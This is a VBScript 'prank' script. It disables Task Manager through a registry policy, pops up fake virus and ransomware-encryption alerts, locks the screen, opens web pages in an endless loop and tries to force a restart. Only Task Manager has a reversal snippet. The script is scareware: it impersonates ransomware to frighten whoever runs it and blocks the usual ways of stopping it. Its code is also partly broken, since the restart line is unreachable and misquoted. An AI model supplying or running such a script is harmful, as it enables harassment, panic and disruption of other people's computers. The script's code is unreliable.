' Ultimate Prank Script - Apocalypse Edition
' Ethical Prank Version (Realistic but Reversible)

' 1. Disable Task Manager (Temporary)
Set objShell = CreateObject("WScript.Shell")
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"

' 2. Play Siren Sound (Requires a siren.wav file in the same directory)
Set objPlayer = CreateObject("WMPlayer.OCX")
objPlayer.URL = "siren.wav"
objPlayer.controls.play

' 3. Fake Virus Warning Messages
X=MsgBox("🚨 CRITICAL SYSTEM ERROR! 🚨", 0+48, "💀 SYSTEM FAILURE 💀")
X=MsgBox("⚠️ SYSTEM BREACH DETECTED! 🔥 Encryption in progress!", 0+48, "💥 CRITICAL BREACH 💥")

' 4. Lock the Screen (Prevent User Actions)
Set objShell = CreateObject("WScript.Shell")
objShell.Run "rundll32.exe user32.dll, LockWorkStation"

' 5. Fake Encryption Progress Bar (For Visual Panic)
For i = 0 To 100 Step 5
    X=MsgBox("Encrypting Files: " & i & "% completed...", 0+48, "💾 SYSTEM ENCRYPTION 💾")
    WScript.Sleep 500
Next

' 6. Open Endless Scary Websites (Can Be Closed Later)
Do
    objShell.Run "https://www.yourdatagone.net"
    WScript.Sleep 2000
    objShell.Run "https://www.scaryviruswarning.com"
    WScript.Sleep 2000
Loop

' 7. Auto-Restart (Looks Like a Full System Crash)
WScript.Sleep 10000
objShell.Run "shutdown -r -t 10 -c \"System failure detected! Restarting...\""

' 8. Reversal Script - Restore Task Manager (Save as another VBS to undo prank)
' Set objShell = CreateObject("WScript.Shell")
' objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD"
' MsgBox "Prank Reversed! Task Manager is back.", 0+64, "Prank Removed"
